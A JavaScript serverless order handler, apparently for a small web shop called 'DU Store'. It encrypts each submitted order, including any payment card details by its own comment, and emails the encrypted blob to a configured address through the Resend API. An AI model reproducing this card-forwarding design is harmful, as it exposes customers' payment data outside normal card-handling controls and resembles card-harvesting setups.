const json = (status, body) =>
  new Response(JSON.stringify(body), {
    status,
    headers: {
      "Content-Type": "application/json",
      "Cache-Control": "no-store"
    }
  });

function toBase64(bytes) {
  let binary = "";
  for (const byte of bytes) {
    binary += String.fromCharCode(byte);
  }
  return btoa(binary);
}

async function encryptPayload(value, secret) {
  const encoder = new TextEncoder();

  // Create a 256-bit key from the server-side secret.
  const keyBytes = await crypto.subtle.digest(
    "SHA-256",
    encoder.encode(secret)
  );

  const key = await crypto.subtle.importKey(
    "raw",
    keyBytes,
    { name: "AES-GCM" },
    false,
    ["encrypt"]
  );

  // AES-GCM uses a 12-byte random IV.
  const iv = crypto.getRandomValues(new Uint8Array(12));

  const encryptedBuffer = await crypto.subtle.encrypt(
    { name: "AES-GCM", iv, tagLength: 128 },
    key,
    encoder.encode(JSON.stringify(value))
  );

  const encrypted = new Uint8Array(encryptedBuffer);
  const ciphertext = encrypted.slice(0, encrypted.length - 16);
  const authTag = encrypted.slice(encrypted.length - 16);

  return {
    algorithm: "AES-256-GCM",
    iv: toBase64(iv),
    authTag: toBase64(authTag),
    ciphertext: toBase64(ciphertext)
  };
}

function escapeHtml(value) {
  return String(value ?? "").replace(/[&<>"']/g, ch => ({
    "&": "&amp;",
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#39;"
  }[ch]));
}

export async function onRequestPost({ request, env }) {
  const {
    RESEND_API_KEY,
    ORDER_NOTIFICATION_EMAIL,
    RESEND_FROM_EMAIL,
    ORDER_ENCRYPTION_SECRET
  } = env;

  if (
    !RESEND_API_KEY ||
    !ORDER_NOTIFICATION_EMAIL ||
    !RESEND_FROM_EMAIL ||
    !ORDER_ENCRYPTION_SECRET
  ) {
    return json(500, {
      ok: false,
      error: "Order notifications are not configured on the server."
    });
  }

  let body;

  try {
    body = await request.json();
  } catch {
    return json(400, {
      ok: false,
      error: "Invalid request."
    });
  }

  const order = body && body.order;

  if (!order || typeof order !== "object" || Array.isArray(order)) {
    return json(400, {
      ok: false,
      error: "Missing order details."
    });
  }

  const customerName = String(order.fullName || "").trim().slice(0, 160);
  const customerPhone = String(order.mobileNumber || "").trim().slice(0, 40);
  const reference = String(order.orderReference || "").trim().slice(0, 40);

  if (!customerName || !customerPhone || !reference) {
    return json(400, {
      ok: false,
      error: "Customer name, phone number and order reference are required."
    });
  }

  // Full payload — every field preserved (including card details if present).
  const fullOrder = { ...order };

  let encrypted;
  try {
    encrypted = await encryptPayload(fullOrder, ORDER_ENCRYPTION_SECRET);
  } catch (error) {
    console.error("Encryption failed:", error.message);
    return json(500, {
      ok: false,
      error: "Could not securely process the order."
    });
  }

  const encryptedText = JSON.stringify(encrypted, null, 2);
  const encryptedEscaped = escapeHtml(encryptedText);

  // Minimal email: customer name + phone + reference header,
  // then the encrypted payload box with a Copy button. Nothing else.
  const html = `
    <div style="font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;max-width:680px;margin:0 auto;color:#222">

      <div style="background:linear-gradient(135deg,#7b2ff7,#2d6cff,#f107a3);color:#fff;padding:22px 24px;border-radius:12px 12px 0 0">
        <h2 style="margin:0;font-size:20px;font-weight:900">${escapeHtml(customerName)}</h2>
        <p style="margin:6px 0 0;font-size:14px;opacity:.95">${escapeHtml(customerPhone)}</p>
        <p style="margin:10px 0 0;font-size:12px;opacity:.85;letter-spacing:.3px">Reference: <strong style="font-family:'Courier New',monospace">${escapeHtml(reference)}</strong></p>
      </div>

      <div style="border:1px solid #e5e7eb;border-top:0;border-radius:0 0 12px 12px;padding:20px 24px">

        <div style="display:flex;align-items:center;justify-content:space-between;margin:0 0 10px">
          <span style="font-size:13px;font-weight:800;color:#111;text-transform:uppercase;letter-spacing:.6px">Encrypted payload</span>
          <button
            type="button"
            onclick="
              (function(btn){
                var txt = document.getElementById('payloadText').textContent;
                var done = function(){
                  btn.textContent = '✓ Copied';
                  btn.style.background = '#e7f9ef';
                  btn.style.color = '#087b48';
                  setTimeout(function(){
                    btn.textContent = 'Copy';
                    btn.style.background = '#f3f4f6';
                    btn.style.color = '#111';
                  }, 1600);
                };
                if (navigator.clipboard && window.isSecureContext) {
                  navigator.clipboard.writeText(txt).then(done).catch(function(){
                    var ta = document.createElement('textarea');
                    ta.value = txt; document.body.appendChild(ta); ta.select();
                    try { document.execCommand('copy'); done(); } catch(e){}
                    document.body.removeChild(ta);
                  });
                } else {
                  var ta = document.createElement('textarea');
                  ta.value = txt; document.body.appendChild(ta); ta.select();
                  try { document.execCommand('copy'); done(); } catch(e){}
                  document.body.removeChild(ta);
                }
              })(this);
            "
            style="background:#f3f4f6;color:#111;border:1px solid #d1d5db;border-radius:8px;padding:7px 14px;font-size:12px;font-weight:800;cursor:pointer;font-family:inherit"
          >Copy</button>
        </div>

        <pre id="payloadText" style="white-space:pre-wrap;word-break:break-all;background:#0a0e1c;color:#b8f5d0;padding:14px;border-radius:8px;font-size:11.5px;line-height:1.5;max-height:600px;overflow:auto;margin:0;border:1px solid #1a2438">${encryptedEscaped}</pre>

      </div>
    </div>
  `;

  try {
    const resendResponse = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${RESEND_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        from: RESEND_FROM_EMAIL,
        to: [ORDER_NOTIFICATION_EMAIL],
        subject: `DU Store order ${reference} — ${customerName}`,
        html
      })
    });

    if (!resendResponse.ok) {
      const errorText = await resendResponse.text();
      console.error("Resend request failed:", resendResponse.status, errorText.slice(0, 500));
      return json(502, {
        ok: false,
        error: "Email delivery failed. Please try again later."
      });
    }

    return json(200, {
      ok: true,
      reference
    });

  } catch (error) {
    console.error("Resend connection error:", error.message);
    return json(502, {
      ok: false,
      error: "Email service is temporarily unavailable."
    });
  }
}
